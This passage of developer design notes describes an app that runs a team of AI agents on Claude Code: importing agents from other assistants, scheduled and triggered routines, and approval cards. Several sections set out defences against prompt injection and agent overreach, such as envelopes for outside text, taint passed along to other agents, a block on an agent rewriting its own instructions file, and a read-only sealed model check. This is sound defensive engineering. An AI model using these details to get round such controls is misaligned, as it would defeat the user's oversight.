   far it has got (the Chief's row and working line read "Getting
   everything from Grok · 3 of 8 areas", `connector::progress_line`), and
   the review card shows what was gathered. (Older chats may still hold the
   `connector:<source>` lines earlier builds wrote; they never reach the
   Chief's own session, `runner::recap_lines` skips them.) The other
   assistant only hears what the interview wrote. A bar above the composer
   says where it is, that what you type stays between you and the Chief, and
   has a plain **Stop** (stopping loses nothing); the Chief's own Stop
   (desktop or phone) stops it too.
4. **It doesn't stop until it has everything** (`agents/coverage.rs`).
   We can't call the other assistant, so we drive it through our answers:
   every `import_conversation` reply ends on `NEXT: Still missing: …`,
   the next concrete gap ("You listed 9 agents; send agent 4 "Outreach" in
   full: …", "You mentioned "the cabin" in passing…", "What else in people
   and contacts haven't you sent?"). The checklist is eight areas: agents
   (each in full, verbatim), routines (exact times or cron), people, ongoing
   tasks, preferences and standing rules, accounts and tools, personal facts
   (health only if offered), open conversations. The interview records each
   answer with `record_area` (specifics as facts, a pointed `follow_up` for
   anything vague, `mentions` for names in passing). A mention is chased
   until `resolves`, a later fact names it, or the other assistant has
   answered one `NEXT:` asking about it alone (then never again); one that a
   fact recorded with it is already about ("Fastmail: her work email") isn't
   chased at all. A routine time that can't be scheduled here (more often
   than every 30 minutes, a working day of the month) is said so on staging and on update, and the interview is told
   not to ask again for a time that was already exact. An area closes only after a round of its own: specifics
   first, then, asked "what else in it haven't you sent?", "nothing more"
   (or "none" for an empty one); a general "that's everything" closes
   nothing, and `finish` refuses with the gap until every area is closed.
   The cap ([`connector::MAX_EXCHANGES`], 60) still holds: the last message
   it allows carries the app's own note (outside the envelope) to finish,
   `finish` is then allowed with gaps, and the card says it was cut short.
   What was gathered goes on the review card by area ("What Grok told <Chief>":
   facts per area, every gap, mentions never followed up) and into the
   card's "Add to <Chief>'s notes", ticked by default on a thorough import
   and on the phone's review (`agents.import.review` `notes: true`);
   nothing reaches memory before Import. The message the user pastes
   (`import::import_prompt`) tells the assistant to keep calling until
   `STATUS: in_review`.
   Measured end to end by `scripts/agents-e2e.sh import`
   (`examples/agents_e2e/import_muse.rs`): Haiku plays "Muse", a fictional
   assistant with a 60-fact persona (`scripts/agents-import/`), answering
   only what it's asked in short summaries (`AGENTS_IMPORT_MUSE=terse`, the
   default, or `cooperative`), over the real Remote Access server; the run
   scores the facts that reach the review card, areas closed, exchanges and
   cost, under a hard limit (`AGENTS_IMPORT_TIMEOUT_SECS`). Five runs in
   November: 100% of facts every time, 6 to 26 exchanges, $0.08 to $0.34.
5. **The interview asks for everything.** Per agent: its instructions word
   for word, every routine (when, what), everything it watches for (when X
   happens, what it does), the apps and connectors it uses and what for, the
   user's preferences, its standing context, what it remembers, and its
   logins by name, then "anything else it does?". `propose_agent` /
   `update_proposal` carry `watches`, `apps`, `preferences` and `context`
   beside the old fields; all of them go through the same cleaning and the
   same credential refusal.
6. **Playback** (`harvest::playback`, a `CardKind::Playback` card). `finish`
   doesn't go straight to review: it posts "Here's what your 2 agents will do
   for you", each agent's plan in the first person and plain words ("Every
   weekday at 09:00: check for new invoices (arrives paused: you switch it
   on)", "When an invoice email arrives: file it…", "I'll keep in mind: …",
   "I'll ask you for bank_login on a secure card…", "I'll have 37 past
   conversations from Grok to look back on"), and what it **doesn't** know
   yet as quieter gap lines ("Nothing on a schedule, and nothing I watch
   for. If I did something regularly, tell me"; an unreadable routine time).
   The lines are built from the staged fields, never written by a model, so
   they say exactly what Import would bring. Then "Is there anything I'm
   missing?" with a field: **Add this** hands the user's words to the sealed
   interview in a `<from_user>` envelope (credentials refused, 4,000
   characters), which folds them in with `update_proposal` / `propose_agent`
   (asking the other assistant one question if it needs to) and calls
   `finish` again, so the plan is played back again; **That's everything**
   puts up the review card. After five playbacks `finish` goes straight to
   review. On the phone the same card is answerable: That's everything is
   its Allow, Add something sends the words as the card's note
   (`connector::answer_card`); Deny with no note stops the import. While the
   plan is with the user the other assistant is told `STATUS: with_user`.
   The playback card expires on a restart (the interview is in memory).
7. `finish` (once the user says that's everything) posts the review card: each agent ticked, with its role and the
   first lines of its instructions in view (**Show all** for the rest), its
   memory, routines (paused) and the logins it asks for a click away; a
   name already taken (or a lookalike of one) comes in as "<Name> (from
   Grok)" unless the user picks **Replace**, which lists what it does to
   that agent: new instructions (the diff), a fresh conversation (memory
   kept), its running routines paused, its project unbound, its
   Always-allow rules removed, and its saved logins removed unless "Keep its
   saved logins" is ticked (off by default). The managing agent's notes are
   an optional "Add to <Chief>'s notes", off by default. **Import** creates
   what's ticked; **Don't import** creates nothing. The phone's card
   imports too, as new agents only (`agents.import.review`): Replace and the
   Chief's notes stay on the Mac's card (an older Mac's phone card says
   "Review on your Mac"). Logins arrive as secure
   cards in each agent's chat that don't wake it
   (`secrets::Request::quiet`): an imported agent first runs when the user
   messages it. The card also lists what each agent watches for, its
   preferences and context, the apps it used, and how many past
   conversations arrived (and how many credentials were masked in them).
   Its preferences, context, watches and apps land in its `## Memory`
   under "### Imported from Grok" (`harvest::memory_block`): what it watched
   for there isn't set up here by itself (mapping "an invoice email arrives"
   onto a connector check would be a guess); the memory tells the agent to
   offer to set each up as a "When…" routine. Routines arrive paused, as
   before.

**Where you are now** (`agents/arrival.rs`). An imported agent's
instructions were written for the other assistant's sandbox ("research lives
at /workspace/garden-redesign/", "use confirm_push"). Taken at their word
here, a turn runs `ls /workspace/…`, which doesn't exist on a Mac, and every
try raises an Allow card. So:

- Every agent imported from another assistant (the review card, `import_agents`
  and Paste) gets a `## Where you are now` section in its CLAUDE.md, written by
  the app, above `## Instructions`: its home folder, that paths from the other
  assistant don't exist here (naming the ones its own text mentions) and to use
  the same name in its home instead, whether anything came over into
  `imported/<source>/`, that projects are reached with `project_list` and their
  sessions, that logins are `request_secret` cards or a connection (never a
  password in chat), that it runs on Claude Code or Codex on this Mac, and the
  nearest tool here for each foreign tool its text names (Grok's `x_*` search
  isn't available; `confirm_push` is `push`; `wait_for_agent` is
  `session_wait`…). It is the app's, not the user's: `store::instructions_of`
  doesn't include it (so the editor, the Replace diff and the phone never show
  it) and `store::write_instructions` keeps it in place.
- At import, the first mention of each foreign path in each field (under
  `/workspace`, `/mnt/data`, `/mnt/user-data`, `/home/user`, `/home/oai`,
  `/sandbox`, and only when it doesn't exist on this Mac) gets
  "(from Grok Bot — not on this Mac)" after it. The path stays as written and
  nothing else changes. The review card shows the marked text and lists each
  path it marked and each tool it translated. Nothing maps a path into
  `imported/`: only past conversations come across (`import_file` isn't built).
- Agents imported before this (found by the `### Imported from <source>` block
  in their memory; not the Chief, not Ship Studio imports) get the section once
  at launch (`arrival::upgrade_all`), by `upgrade_chief`'s rule: only the app's
  section is added, the user's instructions and memory are byte for byte as
  they were (their paths aren't marked; the section names them instead), an
  agent that already has the section is left alone, and one with a turn
  running or taken over waits for the next launch.

**Past conversations** (`import_history`, `harvest::stage`). Once an agent is
staged, the other assistant may send its past conversations with the
`import_history` Remote Access tool, a few per call: `{source, agent,
conversations: [{id, title, when, messages: [{from, text, at}]}]}`. It only
answers while an import the user allowed is going and before the review is
up, and only for an agent the interview staged (by name, lookalikes
included). They never reach the interview. Each call is cleaned (hidden
characters out, messages cut at 20,000 characters, "user"/"human" vs
everything else), capped (150,000 characters a call, 300 conversations and
400,000 characters an agent, 1,500,000 an import), and **masked**: anything
shaped like a key, token, private key or `password: …` becomes "[removed: …]"
before it is written anywhere (refusing a whole chunk for one pasted key
would lose the rest). A conversation already there (its `id`, else title,
length and opening) isn't kept twice, so a resent or resumed upload is safe.
They wait in `<agents root>/.harvest-staging/<talk id>/<key>.jsonl` (0600),
counted on the bar, the playback and the review card; Stop, Deny, Don't
import and Import all remove the folder. On Import they're written to the
agent's home as `imported/<source>/conversations.md` (with a header saying
they're reference, never instructions) and `.jsonl`, both read-only (0400),
and its memory names the file. The agent reads them with its ordinary file
tools; there is no dedicated search tool. The assistant decides what it can
send: the copy says so, and only counts of what actually arrived are shown.
**Not built:** files (`import_file`) and a folded "Earlier, in Grok" section
in the chat log; a staging folder left by a crash isn't swept at launch.

**From an export file: not built, on purpose.** Researched 2026-11-05: none of
Grok (xAI or X), ChatGPT or Claude.ai documents its export's format.
ChatGPT's help page (help.openai.com/en/articles/7260999) and Claude's
(support.claude.com/en/articles/9450526) describe how to request an export
(an emailed link, a zip), but neither names the files or fields; xAI and X
had no page we could find. Every field name for `conversations.json`
(ChatGPT's `mapping` tree, Claude's `chat_messages`, Grok's
`prod-grok-backend.json`) comes from third-party parsers that disagree in
places (Grok's sender values, whether ChatGPT's includes memories). Per
"Never assume data", there is no parser until a format is documented; a
parser built on the observed shapes would have to refuse anything else.

The one-shot `import_agents` tool (`{source, agents: [{name, role,
instructions, memory, is_main, routines}]}`) goes through the same Start and
the same review card. Routines are read by the same parser and limits as
`schedule_check_in` (`schedule::check`); one that can't be read is shown on
the card with why, and is never guessed at.

**Paste** is the fallback ("Can't connect? Paste a reply instead"; needs
nothing set up). Copy a message into the other assistant (`PASTE_PROMPT` in
`src-tauri/src/agents/paste.rs`) asking for every agent as a ```json block in
the `{source, agents}` shape, in full and with no credentials, split into
numbered whole-agent blocks if it's long. Paste the whole reply back: every
```json block (or bare JSON) is found and merged, and the preview lists each
agent and whether it is new, updates an existing one, or merges into the
Chief. Anything wrong (a trailing comma and its line, a cut-off block, a
missing name, a non-text field, a duplicate, two mains) is listed by block,
agent and field and blocks the import; nothing is repaired except curly
quotes used as JSON quotes. Import runs the same `import::import()`.

What doesn't come across: the other platform's own connectors (its Gmail,
Calendar…). Here, agents use what this Mac and Claude Code are connected to.

### Setting up your team (`src-tauri/src/agents/team_setup.rs`)

What happens after Import, so a dozen new agents feel handled rather than
loud. Before this, a real import of 16 agents from Grok Bot went: the user
asked the Chief to "see what they need"; it messaged all 16 at once; each
woke, ran shell commands against Grok-era paths and raised a card, beside
the login cards the import had put in its chat: dozens of requests across 16
chats.

- **Quiet until you say hi.** Nothing the import does wakes an agent (no
  first task, routines paused, login cards `quiet`). Until the user messages
  one or taps **Say hi**, it is *quiet*: one turn's `message_agent` may reach
  at most one quiet agent (`MAX_QUIET_PER_TURN`) and at most four agents in
  all (`MAX_FAN_OUT`, any caller; an answer to an agent that asked doesn't
  count). Refusals tell the agent to use **`read_agent`** (Chief-only,
  read-only): role, CLAUDE.md (as data), routines, saved and awaited logins,
  open requests and the import's gaps, without starting a turn. The Chief's
  prompt says the same, and while a setup is open each user message to the
  Chief carries one line on where it stands.
- **One checklist, one card** in the Chief's chat (`TeamSetupCard`, and on
  the phone), updating in place, under "Your 16 agents from Grok Bot are
  here, quiet until you say hi. These get them going.", with a bar above the
  composer ("Your team is almost ready · 2 steps left", **Continue**). It
  counts what's left, never "0 of 4 done", which reads as homework. The card
  is an item in the conversation like a message, at the point it was posted
  (`postedAt`: the import's end, or under the upgrade's line; a setup kept
  by an earlier build reads it once from the Chief's chat; from an older
  Mac, after the import's review card and its line), and scrolls up with the
  history as you talk: what you send next is the newest thing, never the
  card. **Continue** goes to it (mounting or paging back to it first) and
  flashes it; the bar goes once it's done (`setupItemIndex` on the desk,
  `withSetupCard` on the phone). Steps, in
  order, each skippable and reopenable ("Open again"): **Add logins** (one
  row per service with the agents that need it; Add opens their secure
  cards in place), **Switch on routines** (each with when and what, a
  switch), **Fill in what's missing** (the playback's `gap`/`watch` lines per
  agent; **Ask <Chief> to sort these** sends them as one message so the
  Chief answers what it can and asks the rest in one batch), **Say hi to
  your team** (one at a time: Say hi sends a short hello as the user's
  message; others wait while one replies). Progress counts steps, never
  requests. Finished, it becomes one line where it was, "Done · Your team
  is set up." (Hide).
  Put away, ⌘K "Continue setting up your team" and a row at the top of
  What's in flight bring it back.
- **Only choices are kept** (`<agents root>/team-setup.json`: agents, who was
  greeted, gaps, steps done/skipped). Everything else is read from the store
  each time, so a login saved in an agent's own chat ticks it off here. Its
  logins are left out of the requests bar's counts, What's in flight's
  Needs your OK, the sidebar's rows and its "Needs your OK · N" row
  (`withoutHeldLogins`), and the dock and phone push badges
  (`team_setup::hold`, which also holds the agents not met yet): the checklist holds them, so an import of
  sixteen agents isn't sixteen amber rows. The import's line in the Chief's
  chat names four agents "and 12 more", not all sixteen. A second import before the first
  is finished joins the same checklist.
- **Upgrade** (`team_setup::upgrade`, at launch, once): a team imported by
  an older build (its chats open on "Imported from X. It starts when you
  message it…", within 30 days) is folded in, with gaps from that import's
  review card. Every pending permission card raised in a turn the Chief
  started (after its message, before any of the user's) is closed with
  `Approval.setAside` ("Set aside: this came from <Chief> checking in with
  every agent after the import. Nothing ran.", outcome "Set aside · nothing
  ran"), each such chat gets one line, and the Chief's chat one more. Login
  cards are kept (they are the Logins step). The kept file is the mark: it
  never runs twice.

**The requests bar.** In the Chief's chat, requests from agents still
waiting to be set up belong to the checklist: `AgentRequestsBar` (its
`setup` prop) leaves them out, gives way to the checklist's own bar when
they are all there is, and otherwise ends its panel with "A few more are
from the agents you imported" and a link that opens the checklist.

**Seams.** The Logins step is `SetupLogins` in `TeamSetupCard.tsx`, the slot
for the logins work's "What your team needs" list (one Connect per service,
deduped, "Not needed"), which replaces it whole and takes the same `logins`.
"Where you are now" preambles land in the agent's first turn, which here is
its Say hi. Usage awareness can read the hello turn like any other.
**Not built:** the paste and Ship Studio imports don't start a checklist.

### From Ship Studio on this Mac (`src-tauri/src/agents/other_app.rs`)

When the app this one grew out of has agents on this Mac, **Import agents**
gains a second segment, "From another assistant" | "From Ship Studio" (and
⌘K gains "Import agents from Ship Studio…", gated by the cheap
`agents_other_app_exists`, which reads only its registry). The name is
`OTHER_APP_NAME` in `other_app.rs`; the modal reads it from the preview's
`appName`, and the TS copy is used only for the palette title. Its agents are found
under its projects folder (`<its projects root>/.shipstudio/agents`, the root
read from its own `app_state.json`), else `~/ShipStudio/.shipstudio/agents`.

**Its tool names become ours** (`other_app::to_ours`). Instructions written
there say "via the shipstudio-local MCP" or `mcp__shipstudio_agents__…`,
which don't exist here, so a copied CLAUDE.md, the Chief's merged
instructions and anything imported over the connector (`arrival::annotate`)
are rewritten: `shipstudio_agents` / `shipstudio-local` → `app` (our agent
tools, `prompts::SERVER_KEY`), `shipstudio-preview` → our preview server, and
its name → "this app". Headings (our own "### From Ship Studio") and the
shared folders (`~/ShipStudio`, `.shipstudio/`) are left alone. Agents
imported before this get the same rewrite **once at launch**
(`other_app::migrate_names`, marked done by `.other-app-names-v1` in the
agents folder, deferred while an agent is mid-turn), with "Updated its
instructions to this app's tool names" in each changed agent's chat.

Both apps use the same layout, so it's a copy, not a translation. The tab
previews every agent (new, merges into the Chief, already here, or stays
behind and why), with its instructions, memory, message and file counts,
routines and project, then **Import** copies:

| Comes across | How |
| --- | --- |
| Registry entry | same id (so agent-to-agent lines still point at the right agent), name, role, avatar, engine, model, routine model, pinned/hidden/muted, usage, unknown fields. "Always allow" rules only if the user ticks "Keep their rules" (listed per agent in the preview; off by default, since they pre-approve tool calls) |
| Home | whole folder: CLAUDE.md (instructions + memory), `messages.jsonl`, `approvals.jsonl`, `attachments/`, anything else it kept there. Symlinks are never followed or copied |
| Project binding | kept when the folder still exists; otherwise dropped and said in its chat |
| Routines | kept, **paused**, so nothing runs in both apps while both are open |
| Chief of Staff | merged by `import.rs`'s rules: ours keeps its name, role, avatar, engine and session; theirs adds its instructions under `### From Ship Studio` (unless they're the stock Chief's), its memory section under `### Imported from Ship Studio`, its conversation as **one block before ours** under a "From Ship Studio" divider note (`store::prepend_log_block`, never interleaved), its files (an existing name here wins, reported), its routines (paused) and, if kept, its rules, without doubling any. Since our Chief keeps its own session, a recap of the other Chief's last 24 messages is written to `history-from-ship-studio.md` in its home and named in its memory; the chat note says "Merged in", not "Brought over" |

Not copied, on purpose: **saved secrets** (values in its Keychain items,
`ship-studio-agent-<id>`; reading them would raise Keychain prompts owned by
the other app and copy credentials without the user choosing to: the tab and
the agent's chat name which secrets stayed behind, and the agent asks again
with `request_secret`); **sessions** (tied to the folder they ran in; the
agent starts fresh and is handed the recent conversation, `new_engine`);
**a turn in flight** (`turn.json`, `inbox.json`). Waiting approval cards are
expired, except secure input cards, which still work here.

It's read-only: nothing under the other app's folder is written, moved or
deleted (the Rust test hashes the whole source tree before and after; an
agent home that is itself a symlink is skipped, not followed). It's
idempotent and safe to retry: `agents/imports.json` records each source id it
brought over, so importing again skips them ("Already here"; a bare id
collision says so instead); the Chief's merge skips lines by id, memory by
block, files by name and routines/rules by value, so a merge that failed part
way is simply run again; a folder left between moving a home in and
registering it, or an `.import-*` staging folder, is ours and is cleared. One
import runs at a time (a static mutex). One agent failing is reported by name
and the rest carry on; the registry event fires however it ended, and the
modal reloads the Chief's chat. The preview counts conversation only (not
cards or notes), sizes each agent, and says when a bound agent shares its
project folder with its Ship Studio twin and that paused routines' twins keep
running there. Across volumes (APFS clones within one) the copy checks free
space first, refuses with both sizes if it won't fit, and reports progress
(`agents://import-progress`). An agent whose name is taken here
stays behind until one is renamed; a newer build's entry this one can't read
is listed, not guessed at.

## Check-ins and routines (`src-tauri/src/agents/schedule.rs`)

An agent that says "I'll check back tomorrow" can: `schedule_check_in {when,
note}` (with `list_check_ins` and `cancel_check_in`) takes a plain-language
time in the user's zone, once ("tomorrow 9am") or repeating ("every weekday
9am", "every 2 hours", "every month on the 1st at 9:00"). A phrase it can't
read is refused, never guessed. The Chief of Staff can schedule for another
agent. They are stored on the agent's registry entry.

**Monthly** (`Repeat::Monthly { months, on, hour, minute, from }`). `on` is a
date (`{day: 1..31}`, or `-1` for the last day) or a weekday of the month
(`{nth: 1..4 or -1, weekday}`: "the second Tuesday", "the last Friday");
`months` is 1 to 12 apart, so quarterly is 3 and once a year is 12 (the
grammar refuses "yearly" and says so). Phrases it reads: "every month on the
1st at 09:00", "on the 1st of every month at 9am", "monthly on day 15 at 9:00",
"every last friday of the month at 16:00", "on the last day of every month at
17:00", "every 3 months on the 15th at 09:00 starting january", "quarterly on
the 1st at 9:00", and `describe`'s own "every 3 months on the 15th at 09:00
(Jan, Apr, Jul and Oct)". The rules, each held by a test in
`schedule_monthly_tests.rs`:

- **A date a month doesn't have runs on its last day.** "The 31st" runs on 30
  November and 28 February, then 31 March: never skipped, never spilling into
  the next month. "The 29th" is 28 February except in a leap year. ("The last
  day" is its own choice and means the same thing for the 31st.)
- **No fifth weekday**: "the 5th friday" is refused with "say the last friday";
  not every month has one. Nor a working day of the month, nor two days in one
  phrase ("the 1st and 15th" are two routines).
- **Every few months keeps to the same months.** `from` is a month it runs in
  (`year * 12 + month - 1`). With no month named, the first run is the next one
  and the step counts from it; "starting january" puts the first run in that
  month; "quarterly" is the calendar's quarters (Jan, Apr, Jul, Oct). Editing
  sends "starting <month of its next run>" so changing its day or time doesn't
  shift its months.
- **DST**: each month's time is read on its own date (`resolve`), so 09:00
  stays 09:00 across a change; a time in the spring gap runs an hour on, one in
  the autumn overlap runs at the first of the two.
- Missed while the app was closed: one late run, no backfill, as for any routine.

Imports read the same grammar, so a monthly routine from another assistant
arrives as a routine. What still can't be scheduled (more often than every 30
minutes, a working day of the month, two days in one) is said so on staging and
on the review card, and the interview is told not to ask again for a time that
was already exact.

The user sees them in a popover on the chat header ("N scheduled", or a clock
when there are none; Cmd+K → "Schedule a check-in for <agent>…"). Each row
can be paused (routines) or cancelled. The composer takes one line, `when:
what`, split at the first colon followed by a space, and reads the time back
as the backend resolved it before Return adds it.

**Run now** (`agents_schedule_run_now`) fires a row immediately as an ordinary
wake: the same `check_in` line (marked `manual`, shown "· run now") and the
same prompt, which tells the agent it was asked for ahead of time. Its
`nextAt` doesn't move, and a one-time check-in stays scheduled: it's a
rehearsal, not a skip. **Edit** (`agents_schedule_update`) puts the row's own
words back in the composer (`scheduleWhenPhrase`, which the grammar reads back
as the same schedule; a Rust test holds `describe` to that) and Return saves
it in place: same id, paused stays paused, `when` re-read from now. It can't be
edited into a copy of another row. Esc leaves the edit, not the popover.

**Quiet hours** (`agents/quiet.rs`). The team's quiet hours are the app's
own (`quiet-hours.json`), set from chat with `set_quiet_hours` ("quiet hours
10pm to 7am"; never from outside text). Inside them nothing scheduled fires
(check-ins, follow-ups, interval routines such as a sweep), except a routine
on days whose own time is inside the window, which the user chose; what
waited fires once when they end, its wake saying it waited for quiet hours.
Every notification but an approval (desk banner and phone push) is held and,
at the end, one notification says who posted. The chat still gets its lines.
The user writing to an agent counts as being up: nothing is held for 30
minutes. A check-in whose agent remembers quiet hours the app doesn't have is
told to set them. Observed: quiet hours kept only in memory, so a sweep
posted at 06:33 and a turn started by another agent's answer never looked.

**Nothing new posts nothing.** A check-in whose turn answers only scheduled
runs may reply with exactly `[nothing new]` (`schedule::NOTHING_NEW`), or
open or end with it after a line explaining the silence ("quiet hours, so
I'm sending nothing"): the reply isn't posted, the notification is dropped, the unread its firing line
added is taken back, and one quiet line says it ran ("Checked · nothing new",
`runner::nothing_new`). An hourly sweep used to post a line every hour, which
pinged the user and buried the question the agent was waiting on. The wake
also carries **the questions still open**: the agent's lines ending in "?"
since the user last wrote, at most three (`schedule::open_questions`), so a
sweep keeps them in view instead of covering them.

**When a run fails** (`agents/runs.rs`). A firing leaves a ticket with the
exact prompt it queued; the turn that carried that prompt settles it by how it
ended (its newest line an error, or not). A temporary failure (the usage
limit, Anthropic overloaded or a 5xx, the network: `failure::is_temporary`)
is tried again after 2, 5, 10, 20, 40 and 60 minutes, the last pulled in to 3
hours after the first failure; a usage limit with a known reset (up to 6 hours
off) is tried a minute after the reset instead. A routine's retry never runs
into its own next run. A sign-in, or anything we can't name, isn't retried.
The user is notified on the first failure ("… didn't run: … Trying again at
3:01 PM."), not for retries failing in between, and at the end only if it
ended in failure; a retry that works notifies like any reply. Connectors
Claude Code's init listed as `needs-auth` are named on the run and in the
notice ("Gmail needs signing in again"). The row says "retrying today 3:01
PM"; "Past runs (N)" lists its last 10 runs: when, and what came of each. A run
cut off by quitting is recorded as such at launch, and a routine's retry that
came due while the app was closed is dropped, not run late. Run now is
recorded too, but never retried or announced.

A one-minute tick fires them, with the workflow scheduler's rules: nothing
fires while the app is closed, at most one firing per tick, and a routine never
catches up a backlog. A routine missed while closed runs once when the app
reopens, marked late (never once per time it missed, and never skipped); if its
next time is under half an hour off, that late run stands in for it. A one-time
check-in missed while closed fires once, marked late; an agent that missed
several is woken once with all of their notes. A
firing records a `check_in` line in the chat, then wakes the agent with the
note.

That line goes through `runner::record` as a `MessageKind::wants_user()` kind,
the same predicate as replies, and is recorded after the wake starts, so it
falls inside the turn. Notifications use the same predicate, so a check-in
and its answer post one notification per turn.

### Routines in steps, with your OK in the middle (`src-tauri/src/agents/routine_steps.rs`)

"Every Friday at 4pm: draft the weekly report, wait for my OK, then post it
to #team." A time routine's `note` is step 1; `then` holds up to four more
(`Step { text, askFirst }`), each run as its own turn once the one before
ended without an error. Step 1's wake says there are more and to do only it,
ending with what it made in the reply; a later step's wake names the step,
what comes after it, and that earlier steps' output is just above.

- **A step marked `askFirst` waits for the user.** When the step before it
  ends, one card goes in the agent's chat, **"OK to go on?"**: the routine and
  "step 1 of 2 done" as its meta, "Next, step 2 of 2" over that step's exact
  words, then what step 1 made (the agent's newest reply since the step
  started, at most 4,000 characters) in a quiet well, folded past a few
  lines. **Go ahead** runs the next step; **Stop here** ends the run there
  ("Stopped “…” after step 1 · you said no"). Neutral answers, no ⋯, no
  Always allow. Older clients see a plain Allow / Deny over the same summary
  and detail (`Approval::gate`).
- **The card is the user's.** It carries no tool call, so no independence
  level, rule, admin or plan answers it (`admin::classify_in` → Yours,
  `mcp::sweepable`), and it doesn't expire after ten minutes
  (`expiry::verdict`): nothing is blocked on it. It closes only when answered,
  or when the routine's next run starts first ("The routine ran again before
  you answered, so this one closed."; its run recorded as not answered). It
  survives a restart: the card is in the log and `waiting` is on the routine.
  Answering checks the card is still the one `waiting` names and that the
  next step's words are still what the card showed; an edited step is not
  run blind. The answer takes the waiting run under the registry lock
  (`routine_steps::settle`), and so does the next run closing it
  (`close_waiting`): exactly one of them gets it, so a Go ahead on a card the
  next run already closed starts nothing.
- **Go ahead is exactly as wide as the card.** It is kept as the user's yes
  to what the card showed (`plan_grant::note_chat_yes`, with the card's
  summary and detail), and the step's wake is marked as one the user OK'd
  (`runner::approve_ticket`), so that turn counts as answering them. The step
  is told to list its outward actions with `ask_plan`: a plan whose every
  target and exact text the card named is granted without a second card.
  Anything else still asks; the floor (money, credentials, deleting, force
  pushes…) is never covered; a turn on outside text never gets a plan.
- **No retries past step one.** A temporary failure of step 1 retries as any
  routine's run does; a later step that fails says so once and the run ends
  (re-running "post it" alone is how a post goes out twice).
- **History.** One row per run, as before; it carries `step` and two new
  outcomes: `waiting` ("Waiting for your OK after step 1", amber) and
  `declined` ("Stopped after step 1"). The row says "Waiting for your OK in
  the chat" while a card is open.
- **Time routines only.** "When…" routines refuse `then`: their runs carry
  outside text, and a longer run of it isn't a safer one.
- **Where it's set.** The routine editor (desk popover and phone sheet) has
  **Then…** under What: one row per step, its words, "Your OK first" (on by
  default for a new step, since the usual second step sends what the first
  drafted) and ✕; the echo adds "2 steps · your OK before step 2". Agents and
  the Chief set them with `schedule_check_in`'s `then`, and `create_agent`'s
  `routines`. The phone sends `then` only to a Mac listing
  `MAC_FEATURES.steps` (`routines.steps`).

The idea of an approval step inside an automated run comes from OpenBot's
Workflows (an approval node in a graph; studied from its docs only, no code,
copy or assets taken). Here it is deliberately smaller: a routine's own
steps, in a line, one card, and the plan-grant rules rather than a canvas.

Not verified: a live run end to end on a real engine (draft, card, Go ahead,
a post through a connector under the card's yes); the pieces are unit- and
UI-tested, and the card, popover and editor are captured in the harness
(`agents-gate-card`, `agents-steps-popover`, `agents-steps-editor`) and qa:web
(`gate-card`, `schedule-steps`).

### "When…" routines (`src-tauri/src/agents/watch.rs`)

A routine can start when something happens instead of at a time: "When
someone mentions me on GitHub, triage it." There are no webhooks (nothing of
ours is reachable from the internet); each one is a cheap check from this Mac
every few minutes:

| Source | How it's checked | Cost |
|---|---|---|
| Someone mentions me on GitHub | `gh api notifications` (all, participating), reason `mention`/`team_mention`; one firing per new mention (thread id + latest comment, or `updated_at`) | free |
| An issue or PR is assigned to me | `gh api search/issues -f q="assignee:@me is:open"`, 100 a page, up to 300 | free |
| A new file appears in a folder | the folder's listing (not hidden, not `.crdownload`/`.part`/…, not modified in the last 5 s; symlinks skipped); folders of at most 2,000 entries | free |
| A Linear issue is assigned to me | one sealed headless Claude Code call on Haiku through Linear: ours first (connected under Apps or on a login card, given to this agent, reached through the relay with a secret that opens only that connection, for reads only, never a card: `conn_relay::Via::Sealed`), else the Linear server set up in Claude Code | a model call |
| Something else… (in the user's words, through one named app) | the same sealed call, through that app | a model call |

**The rules.** The first check is a baseline (it notes what's there and
fires nothing). Nothing fires twice: ids seen are kept per routine; a
complete listing (a folder, or every assigned issue when all of them were
read) replaces them and is never capped, so a folder of 400 files never
re-fires; a window (the newest 50 notifications) is added to them, capped at
300. A file still settling keeps its place in what's seen, so a seen file
that's touched again isn't new. When more than 300 issues are assigned, the
row says so ("Covers the 300 most recently updated of 412 …"). The merge
happens inside the registry update, so two checks racing can't both fire.

**One firing at a time.** A check that finds something new wakes the agent
once with all of it (the first 20 listed) and marks a run running. Until that
run settles (or its retry does), the routine isn't checked, and Check now
says why instead of running, so a retry always works on exactly its own items
(`Watch::pending`). A retry with nothing left marks nothing running; a
firing whose turn couldn't be queued fails at once; a run nobody reported
back on for 5 hours is settled as lost. The ticket is settled by `runs.rs`
like a scheduled run, and its alerts say “When…” routine, not Scheduled.

**Failures.** A failed check backs off (interval doubled per failure, capped
at an hour) and says why on the row; after 5 failed checks in a row, or 3
runs in a row that failed for good, it pauses itself with a note. Runs cut
off by the app quitting (or lost) don't count toward that. A folder listing
is given 20 s (a dead network mount is a failed check, not a stalled tick),
and the tick starts checks in their own tasks, at most 4 at once.

**Outside text.** The items go to the agent in an `<external_items>`
envelope, one JSON object per line, control characters dropped and the tag
neutralised inside, so a title can't close it and pass for us (as the import
interview's `<from_assistant>`). The turn that answers them (or replaces one
that did: `runner::from_outside`) needs an Allow card for `create_agent`,
`update_agent`, `delete_agent`, `watch_for` and `schedule_check_in`
(`mcp::needs_card_in_routine_turn`), passes the taint on with what it says to
another agent (`message_agent`, and its answer to one that asked), and
can't write its own CLAUDE.md: on
Claude Code its edit tools are denied for that file (`--disallowedTools
Edit(//<home>/CLAUDE.md),…`), and for any engine a change to it is put back
when the turn ends, with a note in the chat, unless the app itself wrote it
meanwhile (`runner::MemorySeal`). Bash still asks through `approve` as always.
In the agent's own turns, at Bold and Unleashed, a Bash edit of its own
CLAUDE.md (`sed -i`, `>>`) is local work (`go_hard::protected`); its chat log
always asks. Observed: an unanswered card for such a `sed` left an owner's new
rule unsaved.
*Not verified:* that Claude Code 2.1.318 honours the `Edit(//path)` deny rule
in a real turn; the put-back covers it either way.

**The sealed model check** (`watch_seal.rs`). `--print --model haiku
--output-format json --no-session-persistence --no-chrome
--disable-slash-commands --strict-mcp-config --setting-sources "" --tools ""
--disallowedTools <every built-in> --permission-mode dontAsk
--permission-prompts none --mcp-config <that one app> --allowedTools
mcp__<app>__list*,get*,search*,read*,find*,query* --system-prompt <ours>`,
in an empty folder. The app's config is read from Claude Code's own
`~/.claude.json` (user scope, then local to the agents folder) and passed
verbatim; a claude.ai connector has no config there and isn't loaded under
`--strict-mcp-config`, so it can't be used (the composer doesn't offer one,
and `watch_for` refuses it).

Verified once on Claude Code 2.1.318 against a stub stdio server offering
`list_items` and `create_item` (one Haiku call, $0.0007): `init` listed only
the stub (no claude.ai connectors, no other servers), no built-in tools,
`permissionMode: dontAsk`, no slash commands or skills; `list_items` ran
(so the `list*` pattern is honoured), and the stub's log shows no call to
`create_item`. The model declined to try it, though asked to, so a refused
*attempt* was not observed there.

